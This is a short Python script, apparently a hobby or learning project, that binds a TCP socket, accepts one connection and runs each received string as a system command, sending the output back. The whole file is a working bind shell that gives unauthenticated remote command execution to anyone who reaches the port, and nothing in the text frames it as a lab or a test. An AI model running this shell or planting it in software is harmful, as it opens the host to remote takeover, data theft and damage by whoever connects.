from config import *
import socket, subprocess

#Creating socket
s = socket.socket()
s.bind((ADDR, PORT))
s.listen(VTY)
#Getting connection object and address of connection
con,raddr = s.accept()
#Connection loop
while 1:
    data = con.recv(1024).decode()
    if data == "exit":
        break
    msg = subprocess.run(data.split(" "), capture_output=True).stdout
    con.send(msg)
s.close()
